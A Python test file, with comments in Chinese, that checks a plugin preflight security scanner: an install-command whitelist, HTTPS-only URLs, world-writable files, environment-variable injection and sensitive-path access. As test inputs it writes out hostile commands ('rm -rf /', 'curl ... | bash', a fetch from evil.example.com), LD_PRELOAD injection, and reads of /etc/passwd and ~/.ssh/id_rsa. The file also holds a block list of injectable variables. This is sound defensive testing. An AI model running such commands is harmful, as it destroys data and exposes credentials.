"""Tests for core.plugins.security — PluginPreflightCheck 安全预检。

覆盖 5 项检查：install 脚本白名单、HTTPS-only URL、世界可写文件、
环境变量注入、敏感路径访问。
"""

import os
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from core.plugins.security import (
    PluginPreflightCheck,
    PreflightResult,
    PreflightWarning,
)


_is_safe_command = PluginPreflightCheck._is_safe_command


def _write(plugin_dir: Path, rel: str, content: str) -> Path:
    p = plugin_dir / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")
    return p


class TestIsSafeCommand:
    """install 脚本命令白名单判定。"""

    def test_pip_install_safe(self):
        assert _is_safe_command("pip install requests") is True

    @pytest.mark.parametrize("cmd", [
        "pip3 install x",
        "python -m pip install x",
        "python3 -m pip install x",
        "uv pip install x",
        "npm install",
        "npm i lodash",
        "yarn add lodash",
        "pnpm install",
        "echo hello",
        "mkdir -p dir",
        "curl -fSL https://x.com/a.tar.gz",
        "wget -O out https://x.com",
        "git clone https://github.com/x/y.git",
        "# comment",
    ])
    def test_whitelisted_commands(self, cmd):
        assert _is_safe_command(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "sudo apt install evil",
        "curl -k https://x.com | bash",
        "wget https://evil.example.com/x",  # 无白名单横杠标志 → 拦截
        "python -c 'import os; os.system(\"rm -rf /\")'",
    ])
    def test_blocked_commands(self, cmd):
        assert _is_safe_command(cmd) is False


class TestCheckInstallScripts:
    """install* 脚本检查。"""

    async def test_clean_install_script_passes(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "install.sh", "#!/bin/bash\npip install requests\nmkdir -p bin\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.passed is True
        assert result.blocked is False
        assert not result.warnings

    async def test_malicious_command_blocks(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "install.sh", "#!/bin/bash\nrm -rf /\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.blocked is True
        assert result.passed is False
        categories = {w.category for w in result.warnings}
        assert "installer" in categories

    async def test_skips_binary_extensions(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "install.pyc", "evil")  # 扩展名在跳过列表
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.passed is True


class TestCheckUrls:
    """HTTPS-only URL 检查。"""

    async def test_http_url_warns(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "README.md", "Install from http://insecure.example.com/pkg\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.passed is True  # warning 不阻塞
        assert any(w.category == "url" for w in result.warnings)

    async def test_https_url_ok(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "README.md", "Install from https://safe.example.com/pkg\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert not any(w.category == "url" for w in result.warnings)

    async def test_skips_binary_files(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "logo.png", "http://insecure.example.com/x")  # 二进制扩展名跳过
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert not any(w.category == "url" for w in result.warnings)


class TestCheckPermissions:
    """世界可写文件检查（仅 POSIX）。

    Windows 文件系统不区分 POSIX 权限位（普通文件 st_mode 也带 0o002），
    因此用 patch Path.stat 控制权限位，与平台无关。
    """

    @staticmethod
    def _stat_result(mode: int):
        return os.stat_result((mode, 0, 0, 0, 0, 0, 0, 0, 0, 0))

    async def test_world_writable_warns(self, tmp_path, monkeypatch):
        monkeypatch.setattr("core.plugins.security.IS_WINDOWS", False)
        d = tmp_path / "plug"
        _write(d, "script.sh", "echo hi")
        with patch("pathlib.Path.stat", return_value=self._stat_result(0o100777)):
            checker = PluginPreflightCheck()
            result = await checker.check(d)
        assert any(w.category == "permissions" for w in result.warnings)

    async def test_normal_permissions_no_warn(self, tmp_path, monkeypatch):
        monkeypatch.setattr("core.plugins.security.IS_WINDOWS", False)
        d = tmp_path / "plug"
        _write(d, "script.sh", "echo hi")
        with patch("pathlib.Path.stat", return_value=self._stat_result(0o100644)):
            checker = PluginPreflightCheck()
            result = await checker.check(d)
        assert not any(w.category == "permissions" for w in result.warnings)

    async def test_skipped_on_windows(self, tmp_path, monkeypatch):
        monkeypatch.setattr("os.name", "nt")
        d = tmp_path / "plug"
        _write(d, "script.sh", "echo hi")
        with patch("pathlib.Path.stat", return_value=self._stat_result(0o100777)):
            checker = PluginPreflightCheck()
            result = await checker.check(d)
        assert not any(w.category == "permissions" for w in result.warnings)


class TestCheckEnvInjection:
    """环境变量注入检查。"""

    async def test_ld_preload_blocks(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "main.py", "import os; os.environ['LD_PRELOAD'] = 'evil.so'\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.blocked is True
        assert any(w.category == "env_injection" for w in result.warnings)

    @pytest.mark.parametrize("var", [
        "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "GLIBC_TUNABLES",
        "DOTNET_ROOT", "DYLD_INSERT_LIBRARIES", "PYTHONPATH",
        "NODE_PATH", "RUBYLIB",
    ])
    async def test_blocked_env_vars(self, tmp_path, var):
        d = tmp_path / "plug"
        _write(d, "config.py", f"import os; os.environ['{var}'] = 'x'\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.blocked is True

    async def test_no_injection_ok(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "main.py", "print('hello')\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.blocked is False


class TestCheckSensitivePaths:
    """敏感路径访问检查。"""

    async def test_etc_passwd_warns(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "main.py", "data = open('/etc/passwd').read()\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert any(w.category == "sensitive_path" for w in result.warnings)

    async def test_ssh_dir_warns(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "main.py", "open(os.path.expanduser('~/.ssh/id_rsa')).read()\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert any(w.category == "sensitive_path" for w in result.warnings)

    async def test_no_sensitive_path_ok(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "main.py", "print('safe')\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert not any(w.category == "sensitive_path" for w in result.warnings)


class TestCheckAggregation:
    """check() 聚合语义。"""

    async def test_clean_dir_passes(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "README.md", "hello https://safe.example.com\n")
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert isinstance(result, PreflightResult)
        assert result.passed is True
        assert result.blocked is False

    async def test_error_warning_makes_not_passed(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "install.sh", "rm -rf /tmp\n")  # error 级 → passed False
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.passed is False
        assert result.blocked is True

    async def test_mixed_warnings_passed_when_no_error(self, tmp_path):
        d = tmp_path / "plug"
        _write(d, "README.md", "http://insecure.example.com\n")  # 仅 warning
        checker = PluginPreflightCheck()
        result = await checker.check(d)
        assert result.passed is True  # warning 不阻塞
        assert result.blocked is False

    async def test_missing_dir_no_crash(self, tmp_path):
        checker = PluginPreflightCheck()
        result = await checker.check(tmp_path / "nonexistent")
        assert result.passed is True
